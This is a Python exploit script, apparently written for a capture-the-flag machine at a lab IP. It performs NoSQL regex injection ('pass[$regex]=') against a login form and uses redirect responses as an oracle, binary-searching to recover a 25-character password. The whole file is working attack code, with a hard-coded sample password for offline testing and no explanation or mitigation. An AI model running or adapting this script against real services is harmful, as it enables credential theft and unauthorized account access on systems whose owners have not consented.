import string

import requests
import re


# Flowchart
#   Client starts by sending range regexes (index 0)
#       ^[0-z]$ = always true, duh (example)
#       ^[0-T]$ = Send this to server, wait for header {Location: /s3cretPA3e.php}
#           Success? converge
#           Failure? check other half
#           ...repeat...

OFFLINE_TEST = False


def check(reg):
    if OFFLINE_TEST:
        pattern = re.compile(reg)
        # test it
        real_password = 'AsDAJ81diiodq908921ANDId9'

        match = pattern.search(real_password)

        return match is not None

    else:
        url = 'http://10.10.10.146/'

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            # might need User-Agent
            'Accept': 'text/html,application/xhtml+xml,application/xml;'
                      'q=0.9,image/avif,image/webp,image/apng,*/*;'
                      'q=0.8,application/signed-exchange;v=b3;q=0.7'
        }

        response = requests.post(url,
                                 headers=headers,
                                 data=f'pass[$regex]={reg}',
                                 allow_redirects=False)

        if response.status_code == 302:
            location = response.headers.get('Location')
            if location == '/s3cretPA3e.php':
                return True

            return False

        # TODO print progress first?
        print(f'unexpected {response.status_code}')
        print(response)
        exit(0)


def do_my_login(length):
    # '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = string.digits + string.ascii_uppercase + string.ascii_lowercase
    cracked = ''

    for i in range(length):
        low_index = 0
        high_index = len(charset) - 1

        while low_index <= high_index:
            mid_index = (low_index + high_index) // 2

            if low_index == high_index - 1:
                cracked += charset[mid_index]
                break
            else:
                reg = ('^' + cracked
                       + f'[{charset[mid_index]}-{charset[high_index]}]'
                       + ('.' * ((length - i) - 1)) + '$')
                if check(reg):
                    low_index = mid_index
                else:
                    high_index = mid_index

    print(f"Cracked password: {cracked}")


if __name__ == '__main__':
    do_my_login(25)
